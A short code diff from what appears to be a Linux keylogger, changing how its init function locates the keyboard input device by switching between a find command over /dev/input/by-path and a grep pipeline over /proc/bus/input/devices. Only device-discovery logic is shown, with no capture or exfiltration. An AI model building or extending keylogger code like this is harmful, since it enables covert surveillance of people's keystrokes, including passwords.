@@ -70,12 +70,12 @@ void mint_keylogger_init(void)
     //daemonize_keylogger();
 
     /* Mint 19 */
-    //const char *command = "find /dev/input/by-path -name '*serio-0-event-kbd*'";
-    const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";
+    const char *command = "find /dev/input/by-path -name '*serio-0-event-kbd*'";
+    //const char *command = "grep -E 'Handlers|EV' /proc/bus/input/devices | grep -B1 120013 | grep -Eo event[0-9]+ | tr '\\n' '\\0'";
 
-    //get_kb_device_filename(command);
+    get_kb_device_filename(command);
 
-    debian_get_kb_device_filename(command);
+    //debian_get_kb_device_filename(command);
 
     return;
 }
